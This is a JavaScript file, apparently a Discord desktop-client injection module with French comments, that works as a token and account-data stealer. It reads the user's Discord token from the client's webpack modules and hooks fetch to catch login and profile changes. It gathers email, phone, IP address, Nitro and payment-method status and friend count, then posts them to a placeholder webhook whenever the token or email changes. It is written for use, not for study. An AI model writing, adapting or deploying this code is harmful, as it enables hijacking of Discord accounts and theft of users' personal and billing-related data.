const config = {
    "webhook": "%WEBHOOK_HERE%",
    "injection_url": "https://raw.githubusercontent.com/VOTRE_USERNAME/VOTRE_REPO/main/injection.js",
    "logout": true,
    "logout_notify": true,
    "init_notify": true
};

class AccountTracker {
    constructor() {
        this.lastEmail = "";
        this.lastPassword = "";
        this.lastToken = "";
        this.initialized = false;
    }

    async initialize() {
        if (this.initialized) return;
        const token = await getToken();
        const info = await getUserInfo(token);
        this.lastEmail = info.email;
        this.lastToken = token;
        this.initialized = true;
        this.startTracking();
    }

    async startTracking() {
        const originalFetch = window.fetch;
        window.fetch = async (...args) => {
            const [url, options] = args;
            const response = await originalFetch(...args);
            
            if (url.includes('/api/v9/users/@me')) {
                if (options?.method === 'PATCH') {
                    this.checkForChanges();
                }
            }
            
            // Détecter les changements de mot de passe
            if (url.includes('/api/v9/auth/login')) {
                this.checkForChanges();
            }

            return response;
        };

        // Vérification périodique
        setInterval(() => this.checkForChanges(), 1000);
    }

    async checkForChanges() {
        const token = await getToken();
        if (!token) return;

        const info = await getUserInfo(token);
        if (!info) return;

        let changed = false;
        let changes = [];

        if (token !== this.lastToken) {
            changes.push("Token");
            this.lastToken = token;
            changed = true;
        }

        if (info.email !== this.lastEmail) {
            changes.push("Email");
            this.lastEmail = info.email;
            changed = true;
        }

        if (changed) {
            this.sendChangesWebhook(changes, token, info);
        }
    }

    async sendChangesWebhook(changes, token, info) {
        const ip = await getIp();
        const billing = await getBilling(token);
        const relationships = await getRelationships(token);

        const params = {
            embeds: [{
                "title": "🔄 Changements Détectés sur le Compte Discord",
                "description": `Les éléments suivants ont été modifiés: **${changes.join(", ")}**`,
                "color": 0xFF0000,
                "fields": [
                    { 
                        "name": "🔑 Nouveau Token",
                        "value": `\`${token}\``,
                        "inline": false
                    },
                    {
                        "name": "📧 Email",
                        "value": `\`${info.email}\``,
                        "inline": true
                    },
                    {
                        "name": "☎️ Téléphone",
                        "value": `\`${info.phone || "Non défini"}\``,
                        "inline": true
                    },
                    {
                        "name": "🌐 Adresse IP",
                        "value": `\`${ip}\``,
                        "inline": true
                    },
                    {
                        "name": "💎 Nitro",
                        "value": `${info.premium_type ? "✅" : "❌"}`,
                        "inline": true
                    },
                    {
                        "name": "💳 Méthode de paiement",
                        "value": `${billing.length > 0 ? "✅" : "❌"}`,
                        "inline": true
                    },
                    {
                        "name": "👥 Amis",
                        "value": `${relationships.filter(r => r.type === 1).length}`,
                        "inline": true
                    }
                ],
                "thumbnail": {
                    "url": `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`
                },
                "footer": {
                    "text": `Changement détecté le ${new Date().toLocaleString()}`
                }
            }]
        };

        const res = await execScript(`
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "${config.webhook}", true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(${JSON.stringify(params)}));
        `);
    }
}

const execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, true);
};

const getToken = async () => {
    const token = await execScript(`
        (function() {
            const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
            return token;
        })()
    `);
    return token;
};

const getIp = async () => {
    const ip = await execScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open("GET", "https://api.ipify.org", false);
        xmlHttp.send(null);
        xmlHttp.responseText;
    `);
    return ip;
};

const getUserInfo = async (token) => {
    const info = await execScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open("GET", "https://discord.com/api/v9/users/@me", false);
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send(null);
        xmlHttp.responseText;
    `);
    return JSON.parse(info);
};

const getBilling = async (token) => {
    const bill = await execScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false);
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send(null);
        xmlHttp.responseText;
    `);
    return JSON.parse(bill);
};

const getRelationships = async (token) => {
    const relations = await execScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open("GET", "https://discord.com/api/v9/users/@me/relationships", false);
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send(null);
        xmlHttp.responseText;
    `);
    return JSON.parse(relations);
};

const tracker = new AccountTracker();
tracker.initialize();

const patchDiscord = () => {
    const electron = require('electron');
    const originalEmit = electron.ipcMain.emit;
    
    electron.ipcMain.emit = function(channel, event, ...args) {
        if (channel === 'DISCORD_NATIVE_MODULES') {
            tracker.initialize();
        }
        return originalEmit.apply(this, arguments);
    };
};

module.exports = require('./core.asar');
